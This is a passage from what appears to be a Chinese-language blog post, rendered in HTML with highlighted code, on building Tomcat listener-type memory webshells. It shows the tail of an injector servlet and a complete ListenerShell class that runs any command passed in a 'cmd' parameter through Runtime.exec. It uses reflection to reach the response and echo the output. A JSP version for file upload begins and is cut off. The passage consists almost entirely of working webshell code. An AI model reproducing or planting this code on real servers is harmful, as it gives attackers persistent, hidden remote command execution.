+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Injection Failed: &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getMessage</span><span style="color: #ABB2BF">());</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p><code>ListenerShell</code>（<strong>恶意代码填装</strong>）</p>
+<p>写入cmd判别攻击的逻辑+回显</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #FFFFFF">L</span><span style="color: #C678DD">istener</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.ServletRequestEvent</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.ServletRequestListener</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.annotation.WebListener</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServletRequest</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.http.HttpServletResponse</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.BufferedReader</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.InputStream</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.InputStreamReader</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Field</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebListener</span></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ListenerShell</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ServletRequestListener</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> requestDestroyed</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequestEvent</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">servletRequestEvent</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> requestInitialized</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequestEvent</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">servletRequestEvent</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">req</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (HttpServletRequest) </span><span style="color: #E5C07B">servletRequestEvent</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getServletRequest</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">cmd</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">// 1. 增加非空判断，防止干扰正常请求</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (cmd </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">cmd</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isEmpty</span><span style="color: #ABB2BF">()) {</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF"> {</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #7F848E; font-style: italic">// 2. 获取 Response</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">HttpServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">resp</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getResponseFromRequest</span><span style="color: #ABB2BF">(req);</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (resp </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">result</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">CommandExec</span><span style="color: #ABB2BF">(cmd);</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #7F848E; font-style: italic">// 3. 解决回显内容乱码或缺失</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">resp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(result);</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">resp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">flush</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #7F848E; font-style: italic">// 4. 这里的控制台输出可以确认是否触发成功</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Success! Executed: &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> cmd);</span></span>
+<span class="line"><span style="color: #ABB2BF">                }</span></span>
+<span class="line"><span style="color: #ABB2BF">            } </span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">(); </span><span style="color: #7F848E; font-style: italic">// 实验阶段一定要打印报错！</span></span>
+<span class="line"><span style="color: #ABB2BF">            }</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">String</span><span style="color: #61AFEF"> CommandExec</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">cmd</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">rt</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Process</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">proc</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">rt</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(cmd);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">stderr</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">  </span><span style="color: #E5C07B">proc</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InputStreamReader</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">isr</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InputStreamReader</span><span style="color: #ABB2BF">(stderr);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">BufferedReader</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">br</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">BufferedReader</span><span style="color: #ABB2BF">(isr);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">line</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">StringBuffer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">sb</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">StringBuffer</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> ((line </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">br</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readLine</span><span style="color: #ABB2BF">()) </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(line </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">synchronized</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">HttpServletResponse</span><span style="color: #61AFEF"> getResponseFromRequest</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">var1</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF"> {</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">// 1. 从 RequestFacade 拿到 org.apache.catalina.connector.Request</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">reqField</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">var1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;request&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">reqField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">connectorRequest</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">reqField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(var1);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">// 2. 从 connector.Request 拿到 connector.Response</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">respField</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">connectorRequest</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;response&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">respField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">connectorResponse</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">respField</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(connectorRequest);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">// 3. 返回真正的 HttpServletResponse 接口对象</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> (HttpServletResponse) </span><span style="color: #E5C07B">connectorResponse</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getMethod</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;getResponse&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">invoke</span><span style="color: #ABB2BF">(connectorResponse);</span></span>
+<span class="line"><span style="color: #ABB2BF">        } </span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">// 如果失败，尝试最暴力的方式：从线程上下文拿（进阶技巧）</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260410152315597.png" srcset="/img/loading.gif" lazyload alt="image-20260410152315532"></p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.core.StandardContext&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.util.List&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.util.Arrays&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.core.ApplicationContext&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.lang.reflect.Field&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.util.ArrayList&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.io.InputStream&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.connector.Request&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.connector.Response&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%!</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ListenerMemShell</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ServletRequestListener</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> requestInitialized</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequestEvent</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">sre</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">cmd</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF"> {  </span></span>
+<span class="line"><span style="color: #ABB2BF">                cmd </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">sre</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getServletRequest</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">org</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">apache</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">catalina</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">connector</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">RequestFacade</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">requestFacade</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">org</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">apache</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">catalina</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">connector</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">RequestFacade</span><span style="color: #ABB2BF">) </span><span style="color: #E5C07B">sre</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getServletRequest</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">Field</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">requestField</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;org.apache.catalina.connector.RequestFacade&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;request&quot;</span><span style="color: #ABB2BF">);  </span></span>
